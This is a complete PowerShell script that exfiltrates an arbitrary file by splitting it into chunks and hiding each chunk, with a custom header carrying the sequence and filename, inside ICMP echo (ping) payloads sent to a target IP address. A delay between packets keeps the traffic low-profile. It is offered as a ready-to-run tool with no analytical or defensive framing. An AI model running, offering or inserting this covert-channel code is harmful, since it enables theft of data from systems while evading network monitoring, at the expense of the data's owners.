param(
    [Parameter(Mandatory=$true)]
    [string]$FilePath,

    [Parameter(Mandatory=$true)]
    [string]$TargetIP,

    [int]$ChunkSize = 512,          # Safe size (fits within ICMP limits)
    [int]$DelayMs = 200             # Delay between packets
)

# Constants
$MAGIC = [System.Text.Encoding]::ASCII.GetBytes("ICMP")

# Read file
if (!(Test-Path $FilePath)) {
    Write-Error "File not found"
    exit
}

$FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
$FileName = [System.IO.Path]::GetFileName($FilePath)
$FileNameBytes = [System.Text.Encoding]::UTF8.GetBytes($FileName)

# Calculate chunking
$TotalChunks = [math]::Ceiling($FileBytes.Length / $ChunkSize)

Write-Host "[*] Sending file: $FileName"
Write-Host "[*] Size: $($FileBytes.Length) bytes"
Write-Host "[*] Chunks: $TotalChunks"
Write-Host "[*] Target: $TargetIP`n"

# Create ping object
$Ping = New-Object System.Net.NetworkInformation.Ping

for ($i = 0; $i -lt $TotalChunks; $i++) {

    $Start = $i * $ChunkSize
    $Length = [math]::Min($ChunkSize, $FileBytes.Length - $Start)

    # Extract chunk
    $Chunk = New-Object byte[] $Length
    [Array]::Copy($FileBytes, $Start, $Chunk, 0, $Length)

    # Build payload
    $PayloadStream = New-Object System.IO.MemoryStream
    $Writer = New-Object System.IO.BinaryWriter($PayloadStream)

    # ---- HEADER ----
    # MAGIC (4 bytes)
    $Writer.Write($MAGIC)

    # total_chunks (2 bytes, big-endian)
    $Writer.Write([byte[]]([System.BitConverter]::GetBytes([UInt16]$TotalChunks)[1..0]))

    # seq (2 bytes, big-endian)
    $Writer.Write([byte[]]([System.BitConverter]::GetBytes([UInt16]$i)[1..0]))

    # chunk_size (2 bytes, big-endian)
    $Writer.Write([byte[]]([System.BitConverter]::GetBytes([UInt16]$Length)[1..0]))

    # filename_len (2 bytes, big-endian)
    if ($i -eq 0) {
        $Writer.Write([byte[]]([System.BitConverter]::GetBytes([UInt16]$FileNameBytes.Length)[1..0]))
        $Writer.Write($FileNameBytes)
    } else {
        $Writer.Write([byte[]]([System.BitConverter]::GetBytes([UInt16]0)[1..0]))
    }

    # ---- DATA ----
    $Writer.Write($Chunk)

    $Writer.Flush()
    $Payload = $PayloadStream.ToArray()

    # Send ICMP packet
    try {
        $Ping.Send($TargetIP, 1000, $Payload) | Out-Null
        Write-Host ("[*] Sent chunk {0}/{1}" -f ($i+1), $TotalChunks)
    } catch {
        Write-Warning "Failed to send chunk $i"
    }

    Start-Sleep -Milliseconds $DelayMs
}

Write-Host "`n[+] File transmission complete"
